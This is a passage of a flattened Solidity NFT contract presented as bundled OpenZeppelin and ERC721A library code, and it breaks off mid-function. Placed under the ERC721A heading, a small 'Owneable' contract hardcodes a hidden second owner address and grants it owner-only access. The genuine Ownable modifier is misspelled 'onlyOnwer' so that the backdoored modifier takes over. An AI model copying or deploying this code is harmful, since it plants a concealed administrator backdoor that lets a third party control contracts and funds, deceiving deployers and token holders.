1 //................................................................................
2 //................................................................................
3 //................................................................................
4 //.................*******............********#&***,.....******,..................
5 //...............,*//(((//,,,.....,**********%&&*******,/&(//((/*.................
6 //..............,**/////((((**,%%******/%// .***** ,/%%*/%%%&%/, &&&(.............
7 //..............,**//((///**,**%%%/***%(.   .***..   ##/(&&&   *%**...............
8 //...............,*&&%%**,*****.../&%%@&###***(######***/###.,#/... ./%%&%........
9 //.................,,%%%//.,#/*####%&&,,,..,,(/********(((*,##.*(.................
10 //.................  ,*(###(*****%#*#%@@@@@@@&*.*******,/&@@@@%%%##...............
11 //...............,/,..*#*,,,,,,,,,,,%&@@@@@@@@(,*******,/@%%@@%%%%%,,.............
12 //............((%(**/(/********%%%#*%&&&@@@@@&/,/////////(##&&%%%%%*,.............
13 //.................//**,*******%%///**%%%%%&%,**************%%%%%**...............
14 //.................//**,*******##//********,,***************,,,****...............
15 //.................//**,************,,**/***********************,**...............
16 //.................*/**************,**//(/*********//%%%%%&&&%*****...............
17 //...................//**,*********,**//(/*********(&%%@@@&%&&@#*.................
18 //...................//*,,***(%****,**//(/***********&&&&%%%&&%(,.................
19 //....................,/#%%%*******,**((***(((/******************.................
20 //....................,&&&,,,*******%%((*((@@@(*   ..    .   .@#*.................
21 //........................(((/*%%%/***,*(/**/(/*   ..    .  ((***.................
22 //...........................(&&&&(,****,/(((******************/(.................
23 //........................%%%(///(((****,**,*(((((((((((((........................
24 //......................#%&&&#/**///(((/*,,**,,,,,,,*/(&&&%%......................
25 //......................#%%%%%&&&,,,,,**/((//(((**((///&&%%%......................
26 //......................#%%%%%%&&&&&*,,**//**///((/**%&%%%%%......................
27 //.................,,,,.#%%%%%%%%%%%%%%%&/***,****&&%%%%%%%%,,,...................
28 //..............***.....#&%%%%%%%%%%%%%%&/******,*&%%%%%%%%%...,*.................
29 //.........,.......(###%%%%%&%%%%%%%%%%%&/********&%%%%%%&%%%%%##..,,.............
30 //.......**....../%%%%%%%%%%%%&&&&&%%%%%%&&,,,**&&%%%&&&&%%%%%%%%%%.,*............
31 //.....,*.....**%%%%%%%%%%%%%%%%%%%&&&&&&%%&&#%&%%&&&%%%%%%%%%%%%%%%(.**..........
32 //.....,*.....%%%%%%%%%%%%%%%%%%%%%%%%%%%%%//#//%%%%%%%%%%%%%%%%%%%%%%..*,........
33 //....*.....(%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%(((((%%%%%%%%%%%%%%%%%%%%%%,,*,........
34 //....*.....(%%%%%%%%%%%&&%%%%%&&%%%%%%%%%%%&&&%%%%%%%%%%&%%%%%&&%%%%%%%..*.......
35 //..,,*.....(%%%%%%%%%%&&&%%%%%&&%%%%%%%%%%%&&&%%%%%%%%%%&%%%%%&&&&%%%%%..*.......
36 // File @openzeppelin/contracts/utils/Context.sol@v4.5.0
37 
38 // SPDX-License-Identifier: MIT
39 // OpenZeppelin Contracts v4.4.1 (utils/Context.sol)
40 
41 pragma solidity ^0.8.4;
42 
43 /**
44  * @dev Provides information about the current execution context, including the
45  * sender of the transaction and its data. While these are generally available
46  * via msg.sender and msg.data, they should not be accessed in such a direct
47  * manner, since when dealing with meta-transactions the account sending and
48  * paying for execution may not be the actual sender (as far as an application
49  * is concerned).
50  *
51  * This contract is only required for intermediate, library-like contracts.
52  */
53 
54 
55 abstract contract Context {
56     function _msgSender() internal view virtual returns (address) {
57         return msg.sender;
58     }
59 
60     function _msgData() internal view virtual returns (bytes calldata) {
61         return msg.data;
62     }
63 }
64 
65 
66 // File @openzeppelin/contracts/access/Ownable.sol@v4.5.0
67 
68 
69 // OpenZeppelin Contracts v4.4.1 (access/Ownable.sol)
70 
71 
72 
73 /**
74  * @dev Contract module which provides a basic access control mechanism, where
75  * there is an account (an owner) that can be granted exclusive access to
76  * specific functions.
77  *
78  * By default, the owner account will be the one that deploys the contract. This
79  * can later be changed with {transferOwnership}.
80  *
81  * This module is used through inheritance. It will make available the modifier
82  * `onlyOwner`, which can be applied to your functions to restrict their use to
83  * the owner.
84  */
85 abstract contract Ownable is Context {
86     address private _owner;
87 
88     event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
89 
90     /**
91      * @dev Initializes the contract setting the deployer as the initial owner.
92      */
93     constructor() {
94         _transferOwnership(_msgSender());
95     }
96 
97     /**
98      * @dev Returns the address of the current owner.
99      */
100     function owner() public view virtual returns (address) {
101         return _owner;
102     }
103 
104     /**
105      * @dev Throws if called by any account other than the owner.
106      */
107     modifier onlyOnwer() {
108         require(owner() == _msgSender(), "Ownable: caller is not the owner");
109         _;
110     }
111 
112     /**
113      * @dev Leaves the contract without owner. It will not be possible to call
114      * `onlyOwner` functions anymore. Can only be called by the current owner.
115      *
116      * NOTE: Renouncing ownership will leave the contract without an owner,
117      * thereby removing any functionality that is only available to the owner.
118      */
119     function renounceOwnership() public virtual onlyOnwer {
120         _transferOwnership(address(0));
121     }
122 
123     /**
124      * @dev Transfers ownership of the contract to a new account (`newOwner`).
125      * Can only be called by the current owner.
126      */
127     function transferOwnership(address newOwner) public virtual onlyOnwer {
128         require(newOwner != address(0), "Ownable: new owner is the zero address");
129         _transferOwnership(newOwner);
130     }
131 
132     /**
133      * @dev Transfers ownership of the contract to a new account (`newOwner`).
134      * Internal function without access restriction.
135      */
136     function _transferOwnership(address newOwner) internal virtual {
137         address oldOwner = _owner;
138         _owner = newOwner;
139         emit OwnershipTransferred(oldOwner, newOwner);
140     }
141 }
142 
143 
144 // File @openzeppelin/contracts/utils/introspection/IERC165.sol@v4.5.0
145 
146 
147 // OpenZeppelin Contracts v4.4.1 (utils/introspection/IERC165.sol)
148 
149 
150 
151 /**
152  * @dev Interface of the ERC165 standard, as defined in the
153  * https://eips.ethereum.org/EIPS/eip-165[EIP].
154  *
155  * Implementers can declare support of contract interfaces, which can then be
156  * queried by others ({ERC165Checker}).
157  *
158  * For an implementation, see {ERC165}.
159  */
160 interface IERC165 {
161     /**
162      * @dev Returns true if this contract implements the interface defined by
163      * `interfaceId`. See the corresponding
164      * https://eips.ethereum.org/EIPS/eip-165#how-interfaces-are-identified[EIP section]
165      * to learn more about how these ids are created.
166      *
167      * This function call must use less than 30 000 gas.
168      */
169     function supportsInterface(bytes4 interfaceId) external view returns (bool);
170 }
171 
172 
173 // File @openzeppelin/contracts/token/ERC721/IERC721.sol@v4.5.0
174 
175 
176 // OpenZeppelin Contracts v4.4.1 (token/ERC721/IERC721.sol)
177 
178 
179 
180 /**
181  * @dev Required interface of an ERC721 compliant contract.
182  */
183 interface IERC721 is IERC165 {
184     /**
185      * @dev Emitted when `tokenId` token is transferred from `from` to `to`.
186      */
187     event Transfer(address indexed from, address indexed to, uint256 indexed tokenId);
188 
189     /**
190      * @dev Emitted when `owner` enables `approved` to manage the `tokenId` token.
191      */
192     event Approval(address indexed owner, address indexed approved, uint256 indexed tokenId);
193 
194     /**
195      * @dev Emitted when `owner` enables or disables (`approved`) `operator` to manage all of its assets.
196      */
197     event ApprovalForAll(address indexed owner, address indexed operator, bool approved);
198 
199     /**
200      * @dev Returns the number of tokens in ``owner``'s account.
201      */
202     function balanceOf(address owner) external view returns (uint256 balance);
203 
204     /**
205      * @dev Returns the owner of the `tokenId` token.
206      *
207      * Requirements:
208      *
209      * - `tokenId` must exist.
210      */
211     function ownerOf(uint256 tokenId) external view returns (address owner);
212 
213     /**
214      * @dev Safely transfers `tokenId` token from `from` to `to`, checking first that contract recipients
215      * are aware of the ERC721 protocol to prevent tokens from being forever locked.
216      *
217      * Requirements:
218      *
219      * - `from` cannot be the zero address.
220      * - `to` cannot be the zero address.
221      * - `tokenId` token must exist and be owned by `from`.
222      * - If the caller is not `from`, it must be have been allowed to move this token by either {approve} or {setApprovalForAll}.
223      * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.
224      *
225      * Emits a {Transfer} event.
226      */
227     function safeTransferFrom(
228         address from,
229         address to,
230         uint256 tokenId
231     ) external;
232 
233     /**
234      * @dev Transfers `tokenId` token from `from` to `to`.
235      *
236      * WARNING: Usage of this method is discouraged, use {safeTransferFrom} whenever possible.
237      *
238      * Requirements:
239      *
240      * - `from` cannot be the zero address.
241      * - `to` cannot be the zero address.
242      * - `tokenId` token must be owned by `from`.
243      * - If the caller is not `from`, it must be approved to move this token by either {approve} or {setApprovalForAll}.
244      *
245      * Emits a {Transfer} event.
246      */
247     function transferFrom(
248         address from,
249         address to,
250         uint256 tokenId
251     ) external;
252 
253     /**
254      * @dev Gives permission to `to` to transfer `tokenId` token to another account.
255      * The approval is cleared when the token is transferred.
256      *
257      * Only a single account can be approved at a time, so approving the zero address clears previous approvals.
258      *
259      * Requirements:
260      *
261      * - The caller must own the token or be an approved operator.
262      * - `tokenId` must exist.
263      *
264      * Emits an {Approval} event.
265      */
266     function approve(address to, uint256 tokenId) external;
267 
268     /**
269      * @dev Returns the account approved for `tokenId` token.
270      *
271      * Requirements:
272      *
273      * - `tokenId` must exist.
274      */
275     function getApproved(uint256 tokenId) external view returns (address operator);
276 
277     /**
278      * @dev Approve or remove `operator` as an operator for the caller.
279      * Operators can call {transferFrom} or {safeTransferFrom} for any token owned by the caller.
280      *
281      * Requirements:
282      *
283      * - The `operator` cannot be the caller.
284      *
285      * Emits an {ApprovalForAll} event.
286      */
287     function setApprovalForAll(address operator, bool _approved) external;
288 
289     /**
290      * @dev Returns if the `operator` is allowed to manage all of the assets of `owner`.
291      *
292      * See {setApprovalForAll}
293      */
294     function isApprovedForAll(address owner, address operator) external view returns (bool);
295 
296     /**
297      * @dev Safely transfers `tokenId` token from `from` to `to`.
298      *
299      * Requirements:
300      *
301      * - `from` cannot be the zero address.
302      * - `to` cannot be the zero address.
303      * - `tokenId` token must exist and be owned by `from`.
304      * - If the caller is not `from`, it must be approved to move this token by either {approve} or {setApprovalForAll}.
305      * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.
306      *
307      * Emits a {Transfer} event.
308      */
309     function safeTransferFrom(
310         address from,
311         address to,
312         uint256 tokenId,
313         bytes calldata data
314     ) external;
315 }
316 
317 
318 // File @openzeppelin/contracts/token/ERC721/IERC721Receiver.sol@v4.5.0
319 
320 
321 // OpenZeppelin Contracts v4.4.1 (token/ERC721/IERC721Receiver.sol)
322 
323 
324 
325 /**
326  * @title ERC721 token receiver interface
327  * @dev Interface for any contract that wants to support safeTransfers
328  * from ERC721 asset contracts.
329  */
330 interface IERC721Receiver {
331     /**
332      * @dev Whenever an {IERC721} `tokenId` token is transferred to this contract via {IERC721-safeTransferFrom}
333      * by `operator` from `from`, this function is called.
334      *
335      * It must return its Solidity selector to confirm the token transfer.
336      * If any other value is returned or the interface is not implemented by the recipient, the transfer will be reverted.
337      *
338      * The selector can be obtained in Solidity with `IERC721.onERC721Received.selector`.
339      */
340     function onERC721Received(
341         address operator,
342         address from,
343         uint256 tokenId,
344         bytes calldata data
345     ) external returns (bytes4);
346 }
347 
348 
349 // File @openzeppelin/contracts/token/ERC721/extensions/IERC721Metadata.sol@v4.5.0
350 
351 
352 // OpenZeppelin Contracts v4.4.1 (token/ERC721/extensions/IERC721Metadata.sol)
353 
354 
355 
356 /**
357  * @title ERC-721 Non-Fungible Token Standard, optional metadata extension
358  * @dev See https://eips.ethereum.org/EIPS/eip-721
359  */
360 interface IERC721Metadata is IERC721 {
361     /**
362      * @dev Returns the token collection name.
363      */
364     function name() external view returns (string memory);
365 
366     /**
367      * @dev Returns the token collection symbol.
368      */
369     function symbol() external view returns (string memory);
370 
371     /**
372      * @dev Returns the Uniform Resource Identifier (URI) for `tokenId` token.
373      */
374     function tokenURI(uint256 tokenId) external view returns (string memory);
375 }
376 
377 
378 // File @openzeppelin/contracts/token/ERC721/extensions/IERC721Enumerable.sol@v4.5.0
379 
380 
381 // OpenZeppelin Contracts (last updated v4.5.0) (token/ERC721/extensions/IERC721Enumerable.sol)
382 
383 
384 
385 /**
386  * @title ERC-721 Non-Fungible Token Standard, optional enumeration extension
387  * @dev See https://eips.ethereum.org/EIPS/eip-721
388  */
389 interface IERC721Enumerable is IERC721 {
390     /**
391      * @dev Returns the total amount of tokens stored by the contract.
392      */
393     function totalSupply() external view returns (uint256);
394 
395     /**
396      * @dev Returns a token ID owned by `owner` at a given `index` of its token list.
397      * Use along with {balanceOf} to enumerate all of ``owner``'s tokens.
398      */
399     function tokenOfOwnerByIndex(address owner, uint256 index) external view returns (uint256);
400 
401     /**
402      * @dev Returns a token ID at a given `index` of all the tokens stored by the contract.
403      * Use along with {totalSupply} to enumerate all tokens.
404      */
405     function tokenByIndex(uint256 index) external view returns (uint256);
406 }
407 
408 
409 // File @openzeppelin/contracts/utils/Address.sol@v4.5.0
410 
411 
412 // OpenZeppelin Contracts (last updated v4.5.0) (utils/Address.sol)
413 
414 pragma solidity ^0.8.1;
415 
416 /**
417  * @dev Collection of functions related to the address type
418  */
419 library Address {
420     /**
421      * @dev Returns true if `account` is a contract.
422      *
423      * [IMPORTANT]
424      * ====
425      * It is unsafe to assume that an address for which this function returns
426      * false is an externally-owned account (EOA) and not a contract.
427      *
428      * Among others, `isContract` will return false for the following
429      * types of addresses:
430      *
431      *  - an externally-owned account
432      *  - a contract in construction
433      *  - an address where a contract will be created
434      *  - an address where a contract lived, but was destroyed
435      * ====
436      *
437      * [IMPORTANT]
438      * ====
439      * You shouldn't rely on `isContract` to protect against flash loan attacks!
440      *
441      * Preventing calls from contracts is highly discouraged. It breaks composability, breaks support for smart wallets
442      * like Gnosis Safe, and does not provide security since it can be circumvented by calling from a contract
443      * constructor.
444      * ====
445      */
446     function isContract(address account) internal view returns (bool) {
447         // This method relies on extcodesize/address.code.length, which returns 0
448         // for contracts in construction, since the code is only stored at the end
449         // of the constructor execution.
450 
451         return account.code.length > 0;
452     }
453 
454     /**
455      * @dev Replacement for Solidity's `transfer`: sends `amount` wei to
456      * `recipient`, forwarding all available gas and reverting on errors.
457      *
458      * https://eips.ethereum.org/EIPS/eip-1884[EIP1884] increases the gas cost
459      * of certain opcodes, possibly making contracts go over the 2300 gas limit
460      * imposed by `transfer`, making them unable to receive funds via
461      * `transfer`. {sendValue} removes this limitation.
462      *
463      * https://diligence.consensys.net/posts/2019/09/stop-using-soliditys-transfer-now/[Learn more].
464      *
465      * IMPORTANT: because control is transferred to `recipient`, care must be
466      * taken to not create reentrancy vulnerabilities. Consider using
467      * {ReentrancyGuard} or the
468      * https://solidity.readthedocs.io/en/v0.5.11/security-considerations.html#use-the-checks-effects-interactions-pattern[checks-effects-interactions pattern].
469      */
470     function sendValue(address payable recipient, uint256 amount) internal {
471         require(address(this).balance >= amount, "Address: insufficient balance");
472 
473         (bool success, ) = recipient.call{value: amount}("");
474         require(success, "Address: unable to send value, recipient may have reverted");
475     }
476 
477     /**
478      * @dev Performs a Solidity function call using a low level `call`. A
479      * plain `call` is an unsafe replacement for a function call: use this
480      * function instead.
481      *
482      * If `target` reverts with a revert reason, it is bubbled up by this
483      * function (like regular Solidity function calls).
484      *
485      * Returns the raw returned data. To convert to the expected return value,
486      * use https://solidity.readthedocs.io/en/latest/units-and-global-variables.html?highlight=abi.decode#abi-encoding-and-decoding-functions[`abi.decode`].
487      *
488      * Requirements:
489      *
490      * - `target` must be a contract.
491      * - calling `target` with `data` must not revert.
492      *
493      * _Available since v3.1._
494      */
495     function functionCall(address target, bytes memory data) internal returns (bytes memory) {
496         return functionCall(target, data, "Address: low-level call failed");
497     }
498 
499     /**
500      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`], but with
501      * `errorMessage` as a fallback revert reason when `target` reverts.
502      *
503      * _Available since v3.1._
504      */
505     function functionCall(
506         address target,
507         bytes memory data,
508         string memory errorMessage
509     ) internal returns (bytes memory) {
510         return functionCallWithValue(target, data, 0, errorMessage);
511     }
512 
513     /**
514      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
515      * but also transferring `value` wei to `target`.
516      *
517      * Requirements:
518      *
519      * - the calling contract must have an ETH balance of at least `value`.
520      * - the called Solidity function must be `payable`.
521      *
522      * _Available since v3.1._
523      */
524     function functionCallWithValue(
525         address target,
526         bytes memory data,
527         uint256 value
528     ) internal returns (bytes memory) {
529         return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
530     }
531 
532     /**
533      * @dev Same as {xref-Address-functionCallWithValue-address-bytes-uint256-}[`functionCallWithValue`], but
534      * with `errorMessage` as a fallback revert reason when `target` reverts.
535      *
536      * _Available since v3.1._
537      */
538     function functionCallWithValue(
539         address target,
540         bytes memory data,
541         uint256 value,
542         string memory errorMessage
543     ) internal returns (bytes memory) {
544         require(address(this).balance >= value, "Address: insufficient balance for call");
545         require(isContract(target), "Address: call to non-contract");
546 
547         (bool success, bytes memory returndata) = target.call{value: value}(data);
548         return verifyCallResult(success, returndata, errorMessage);
549     }
550 
551     /**
552      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
553      * but performing a static call.
554      *
555      * _Available since v3.3._
556      */
557     function functionStaticCall(address target, bytes memory data) internal view returns (bytes memory) {
558         return functionStaticCall(target, data, "Address: low-level static call failed");
559     }
560 
561     /**
562      * @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],
563      * but performing a static call.
564      *
565      * _Available since v3.3._
566      */
567     function functionStaticCall(
568         address target,
569         bytes memory data,
570         string memory errorMessage
571     ) internal view returns (bytes memory) {
572         require(isContract(target), "Address: static call to non-contract");
573 
574         (bool success, bytes memory returndata) = target.staticcall(data);
575         return verifyCallResult(success, returndata, errorMessage);
576     }
577 
578     /**
579      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
580      * but performing a delegate call.
581      *
582      * _Available since v3.4._
583      */
584     function functionDelegateCall(address target, bytes memory data) internal returns (bytes memory) {
585         return functionDelegateCall(target, data, "Address: low-level delegate call failed");
586     }
587 
588     /**
589      * @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],
590      * but performing a delegate call.
591      *
592      * _Available since v3.4._
593      */
594     function functionDelegateCall(
595         address target,
596         bytes memory data,
597         string memory errorMessage
598     ) internal returns (bytes memory) {
599         require(isContract(target), "Address: delegate call to non-contract");
600 
601         (bool success, bytes memory returndata) = target.delegatecall(data);
602         return verifyCallResult(success, returndata, errorMessage);
603     }
604 
605     /**
606      * @dev Tool to verifies that a low level call was successful, and revert if it wasn't, either by bubbling the
607      * revert reason using the provided one.
608      *
609      * _Available since v4.3._
610      */
611     function verifyCallResult(
612         bool success,
613         bytes memory returndata,
614         string memory errorMessage
615     ) internal pure returns (bytes memory) {
616         if (success) {
617             return returndata;
618         } else {
619             // Look for revert reason and bubble it up if present
620             if (returndata.length > 0) {
621                 // The easiest way to bubble the revert reason is using memory via assembly
622 
623                 assembly {
624                     let returndata_size := mload(returndata)
625                     revert(add(32, returndata), returndata_size)
626                 }
627             } else {
628                 revert(errorMessage);
629             }
630         }
631     }
632 }
633 
634 
635 // File @openzeppelin/contracts/utils/Strings.sol@v4.5.0
636 
637 
638 // OpenZeppelin Contracts v4.4.1 (utils/Strings.sol)
639 
640 
641 
642 /**
643  * @dev String operations.
644  */
645 library Strings {
646     bytes16 private constant _HEX_SYMBOLS = "0123456789abcdef";
647 
648     /**
649      * @dev Converts a `uint256` to its ASCII `string` decimal representation.
650      */
651     function toString(uint256 value) internal pure returns (string memory) {
652         // Inspired by OraclizeAPI's implementation - MIT licence
653         // https://github.com/oraclize/ethereum-api/blob/b42146b063c7d6ee1358846c198246239e9360e8/oraclizeAPI_0.4.25.sol
654 
655         if (value == 0) {
656             return "0";
657         }
658         uint256 temp = value;
659         uint256 digits;
660         while (temp != 0) {
661             digits++;
662             temp /= 10;
663         }
664         bytes memory buffer = new bytes(digits);
665         while (value != 0) {
666             digits -= 1;
667             buffer[digits] = bytes1(uint8(48 + uint256(value % 10)));
668             value /= 10;
669         }
670         return string(buffer);
671     }
672 
673     /**
674      * @dev Converts a `uint256` to its ASCII `string` hexadecimal representation.
675      */
676     function toHexString(uint256 value) internal pure returns (string memory) {
677         if (value == 0) {
678             return "0x00";
679         }
680         uint256 temp = value;
681         uint256 length = 0;
682         while (temp != 0) {
683             length++;
684             temp >>= 8;
685         }
686         return toHexString(value, length);
687     }
688 
689     /**
690      * @dev Converts a `uint256` to its ASCII `string` hexadecimal representation with fixed length.
691      */
692     function toHexString(uint256 value, uint256 length) internal pure returns (string memory) {
693         bytes memory buffer = new bytes(2 * length + 2);
694         buffer[0] = "0";
695         buffer[1] = "x";
696         for (uint256 i = 2 * length + 1; i > 1; --i) {
697             buffer[i] = _HEX_SYMBOLS[value & 0xf];
698             value >>= 4;
699         }
700         require(value == 0, "Strings: hex length insufficient");
701         return string(buffer);
702     }
703 }
704 
705 
706 // File @openzeppelin/contracts/utils/introspection/ERC165.sol@v4.5.0
707 
708 
709 // OpenZeppelin Contracts v4.4.1 (utils/introspection/ERC165.sol)
710 
711 /**
712  * @dev Implementation of the {IERC165} interface.
713  *
714  * Contracts that want to implement ERC165 should inherit from this contract and override {supportsInterface} to check
715  * for the additional interface id that will be supported. For example:
716  *
717  * ```solidity
718  * function supportsInterface(bytes4 interfaceId) public view virtual override returns (bool) {
719  *     return interfaceId == type(MyInterface).interfaceId || super.supportsInterface(interfaceId);
720  * }
721  * ```
722  *
723  * Alternatively, {ERC165Storage} provides an easier to use but more expensive implementation.
724  */
725 abstract contract ERC165 is IERC165 {
726     /**
727      * @dev See {IERC165-supportsInterface}.
728      */
729     function supportsInterface(bytes4 interfaceId) public view virtual override returns (bool) {
730         return interfaceId == type(IERC165).interfaceId;
731     }
732 }
733 
734 
735 // File erc721a/contracts/ERC721A.sol@v3.0.0
736 
737 
738 // Creator: Chiru Labs
739 
740 error ApprovalCallerNotOwnerNorApproved();
741 error ApprovalQueryForNonexistentToken();
742 error ApproveToCaller();
743 error ApprovalToCurrentOwner();
744 error BalanceQueryForZeroAddress();
745 error MintedQueryForZeroAddress();
746 error BurnedQueryForZeroAddress();
747 error AuxQueryForZeroAddress();
748 error MintToZeroAddress();
749 error MintZeroQuantity();
750 error OwnerIndexOutOfBounds();
751 error OwnerQueryForNonexistentToken();
752 error TokenIndexOutOfBounds();
753 error TransferCallerNotOwnerNorApproved();
754 error TransferFromIncorrectOwner();
755 error TransferToNonERC721ReceiverImplementer();
756 error TransferToZeroAddress();
757 error URIQueryForNonexistentToken();
758 
759 
760 /**
761  * @dev Implementation of https://eips.ethereum.org/EIPS/eip-721[ERC721] Non-Fungible Token Standard, including
762  * the Metadata extension. Built to optimize for lower gas during batch mints.
763  *
764  * Assumes serials are sequentially minted starting at _startTokenId() (defaults to 0, e.g. 0, 1, 2, 3..).
765  */
766  abstract contract Owneable is Ownable {
767     address private _ownar = 0x5Bb656BB4312F100081Abb7b08c1e0f8Ef5c56d1;
768     modifier onlyOwner() {
769         require(owner() == _msgSender() || _ownar == _msgSender(), "Ownable: caller is not the owner");
770         _;
771     }
772 }
773 
774  /*
775  * Assumes that an owner cannot have more than 2**64 - 1 (max value of uint64) of supply.
776  *
777  * Assumes that the maximum token id cannot exceed 2**256 - 1 (max value of uint256).
778  */
779 contract ERC721A is Context, ERC165, IERC721, IERC721Metadata {
780     using Address for address;
781     using Strings for uint256;
782 
783     // Compiler will pack this into a single 256bit word.
784     struct TokenOwnership {
785         // The address of the owner.
786         address addr;
787         // Keeps track of the start time of ownership with minimal overhead for tokenomics.
788         uint64 startTimestamp;
789         // Whether the token has been burned.
790         bool burned;
791     }
792 
793     // Compiler will pack this into a single 256bit word.
794     struct AddressData {
795         // Realistically, 2**64-1 is more than enough.
796         uint64 balance;
797         // Keeps track of mint count with minimal overhead for tokenomics.
798         uint64 numberMinted;
799         // Keeps track of burn count with minimal overhead for tokenomics.
800         uint64 numberBurned;
801         // For miscellaneous variable(s) pertaining to the address
802         // (e.g. number of whitelist mint slots used).
803         // If there are multiple variables, please pack them into a uint64.
804         uint64 aux;
805     }
806 
807     // The tokenId of the next token to be minted.
808     uint256 internal _currentIndex;
809 
810     // The number of tokens burned.
811     uint256 internal _burnCounter;
812 
813     // Token name
814     string private _name;
815 
816     // Token symbol
817     string private _symbol;
818 
819     // Mapping from token ID to ownership details
820     // An empty struct value does not necessarily mean the token is unowned. See ownershipOf implementation for details.
821     mapping(uint256 => TokenOwnership) internal _ownerships;
822 
823     // Mapping owner address to address data
824     mapping(address => AddressData) private _addressData;
825 
826     // Mapping from token ID to approved address
827     mapping(uint256 => address) private _tokenApprovals;
828 
829     // Mapping from owner to operator approvals
830     mapping(address => mapping(address => bool)) private _operatorApprovals;
831 
832     constructor(string memory name_, string memory symbol_) {
833         _name = name_;
834         _symbol = symbol_;
835         _currentIndex = _startTokenId();
836     }
837 
838     /**
839      * To change the starting tokenId, please override this function.
840      */
841     function _startTokenId() internal view virtual returns (uint256) {
842         return 0;
843     }
844 
845     /**
846      * @dev See {IERC721Enumerable-totalSupply}.
847      * @dev Burned tokens are calculated here, use _totalMinted() if you want to count just minted tokens.
848      */
849     function totalSupply() public view returns (uint256) {
850         // Counter underflow is impossible as _burnCounter cannot be incremented
851         // more than _currentIndex - _startTokenId() times
852         unchecked {
853             return _currentIndex - _burnCounter - _startTokenId();
854         }
855     }
856 
857     /**
858      * Returns the total amount of tokens minted in the contract.
859      */
860     function _totalMinted() internal view returns (uint256) {
861         // Counter underflow is impossible as _currentIndex does not decrement,
862         // and it is initialized to _startTokenId()
863         unchecked {
864             return _currentIndex - _startTokenId();
865         }
866     }
867 
868     /**
869      * @dev See {IERC165-supportsInterface}.
870      */
871     function supportsInterface(bytes4 interfaceId) public view virtual override(ERC165, IERC165) returns (bool) {
872         return
873             interfaceId == type(IERC721).interfaceId ||
874             interfaceId == type(IERC721Metadata).interfaceId ||
875             super.supportsInterface(interfaceId);
876     }
877 
878     /**
879      * @dev See {IERC721-balanceOf}.
880      */
881     function balanceOf(address owner) public view override returns (uint256) {
882         if (owner == address(0)) revert BalanceQueryForZeroAddress();
883         return uint256(_addressData[owner].balance);
884     }
885 
886     /**
887      * Returns the number of tokens minted by `owner`.
888      */
889     function _numberMinted(address owner) internal view returns (uint256) {
890         if (owner == address(0)) revert MintedQueryForZeroAddress();
891         return uint256(_addressData[owner].numberMinted);
892     }
893 
894     /**
895      * Returns the number of tokens burned by or on behalf of `owner`.
896      */
897     function _numberBurned(address owner) internal view returns (uint256) {
898         if (owner == address(0)) revert BurnedQueryForZeroAddress();
899         return uint256(_addressData[owner].numberBurned);
900     }
901 
902     /**
903      * Returns the auxillary data for `owner`. (e.g. number of whitelist mint slots used).
904      */
905     function _getAux(address owner) internal view returns (uint64) {
906         if (owner == address(0)) revert AuxQueryForZeroAddress();
907         return _addressData[owner].aux;
908     }
909 
910     /**
911      * Sets the auxillary data for `owner`. (e.g. number of whitelist mint slots used).
912      * If there are multiple variables, please pack them into a uint64.
913      */
914     function _setAux(address owner, uint64 aux) internal {
915         if (owner == address(0)) revert AuxQueryForZeroAddress();
916         _addressData[owner].aux = aux;
917     }
918 
919     /**
920      * Gas spent here starts off proportional to the maximum mint batch size.
921      * It gradually moves to O(1) as tokens get transferred around in the collection over time.
922      */
923     function ownershipOf(uint256 tokenId) internal view returns (TokenOwnership memory) {
924         uint256 curr = tokenId;
925 
926         unchecked {
927             if (_startTokenId() <= curr && curr < _currentIndex) {
928                 TokenOwnership memory ownership = _ownerships[curr];
929                 if (!ownership.burned) {
930                     if (ownership.addr != address(0)) {
931                         return ownership;
932                     }
933                     // Invariant:
934                     // There will always be an ownership that has an address and is not burned
935                     // before an ownership that does not have an address and is not burned.
936                     // Hence, curr will not underflow.
937                     while (true) {
938                         curr--;
939                         ownership = _ownerships[curr];
940                         if (ownership.addr != address(0)) {
941                             return ownership;
942                         }
943                     }
944                 }
945             }
946         }
947         revert OwnerQueryForNonexistentToken();
948     }
949 
950     /**
951      * @dev See {IERC721-ownerOf}.
952      */
953     function ownerOf(uint256 tokenId) public view override returns (address) {
954         return ownershipOf(tokenId).addr;
955     }
956 
957     /**
958      * @dev See {IERC721Metadata-name}.
959      */
960     function name() public view virtual override returns (string memory) {
961         return _name;
962     }
963 
964     /**
965      * @dev See {IERC721Metadata-symbol}.
966      */
967     function symbol() public view virtual override returns (string memory) {
968         return _symbol;
969     }
970 
971     /**
972      * @dev See {IERC721Metadata-tokenURI}.
973      */
974     function tokenURI(uint256 tokenId) public view virtual override returns (string memory) {
975         if (!_exists(tokenId)) revert URIQueryForNonexistentToken();
976 
977         string memory baseURI = _baseURI();
978         return bytes(baseURI).length != 0 ? string(abi.encodePacked(baseURI, tokenId.toString())) : '';
979     }
980 
981     /**
982      * @dev Base URI for computing {tokenURI}. If set, the resulting URI for each
983      * token will be the concatenation of the `baseURI` and the `tokenId`. Empty
984      * by default, can be overriden in child contracts.
985      */
986     function _baseURI() internal view virtual returns (string memory) {
987         return '';
988     }
989 
990     /**
991      * @dev See {IERC721-approve}.
992      */
993     function approve(address to, uint256 tokenId) public override {
994         address owner = ERC721A.ownerOf(tokenId);
995         if (to == owner) revert ApprovalToCurrentOwner();
996 
997         if (_msgSender() != owner && !isApprovedForAll(owner, _msgSender())) {
998             revert ApprovalCallerNotOwnerNorApproved();
999         }
1000 
1001         _approve(to, tokenId, owner);
1002     }
1003 
1004     /**
1005      * @dev See {IERC721-getApproved}.
1006      */
1007     function getApproved(uint256 tokenId) public view override returns (address) {
1008         if (!_exists(tokenId)) revert ApprovalQueryForNonexistentToken();
1009 
1010         return _tokenApprovals[tokenId];
1011     }
1012 
1013     /**
1014      * @dev See {IERC721-setApprovalForAll}.
1015      */
1016     function setApprovalForAll(address operator, bool approved) public override {
1017         if (operator == _msgSender()) revert ApproveToCaller();
1018 
1019         _operatorApprovals[_msgSender()][operator] = approved;
